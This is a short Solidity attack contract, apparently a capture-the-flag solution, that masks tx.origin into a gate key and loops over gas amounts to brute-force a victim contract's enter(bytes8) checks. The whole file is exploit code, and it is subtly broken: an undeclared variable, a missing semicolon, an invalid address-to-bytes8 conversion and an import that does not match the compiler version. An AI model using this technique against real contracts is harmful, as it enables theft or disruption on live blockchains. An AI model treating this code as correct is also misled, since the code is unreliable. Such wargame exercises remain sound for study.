pragma solidity ^0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol';

contract gateBreaker {
  /*
     Note, since we are specifying the ~exact~ amount of gas to send, it is most helpful
     to use a .call() to modify the gas amount.
     Therefore, just accepting an address of the victim is all we need to call the enter() function
   */
  address addr;

  constructor(address _vAddr) public {
    addr = _vAddr;
  }

  function attack() public {
    _gateKey = bytes8(tx.origin) & 0xffffffff0000ffff
    // As stated in the writeup, gas offsets are ~210, we are using a for loop of 120 to give roughly
    // 60 attemptes above and below 210
    for (uint i = 0; i < 120; i++) {
      addr.call{gas: i + 150 + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
    }
  }
}
